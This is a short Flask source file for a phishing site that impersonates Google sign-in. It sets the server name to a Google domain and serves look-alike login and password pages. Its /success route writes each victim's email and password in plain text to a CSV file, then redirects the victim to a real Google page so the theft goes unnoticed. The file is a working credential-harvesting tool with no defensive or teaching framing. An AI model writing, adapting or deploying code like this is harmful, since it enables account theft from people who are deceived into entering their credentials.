from flask import Flask, redirect, url_for, request
from flask import Flask, render_template

app = Flask(__name__)
app.config['SERVER_NAME'] = 'google.com:5000'

@app.route('/success/<name>/<password>')
def success(name, password):
    with open("data.csv", "a") as myfile:
        myfile.write(f"{name},{password}\n")    
    return redirect('https://google.no')

@app.route('/login', methods = ['POST', 'GET'])
def login():
    if request.method == 'POST':
        user = request.form['identifier']
        return redirect(url_for('password', email=user))
    else:
        user = request.args.get('identifier')
        return redirect(url_for('password', email=user))

@app.route('/login2', methods = ['POST', 'GET'])
def login2():
    if request.method == 'POST':
        email = request.form['identifier']
        password = request.form['password']
        return redirect(url_for('success', name=email, password=password))
    else:
        email = request.form['identifier']
        password = request.form['password']
        return redirect(url_for('success', name=email, password=password))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/ServiceLogin')
def ServiceLogin():
    return render_template('login2.html')

@app.route('/password/<email>')
def password(email):
    return render_template('password.html', email=email)

if __name__ == '__main__':
    app.debug = True
    app.run()
    app.run(debug = True)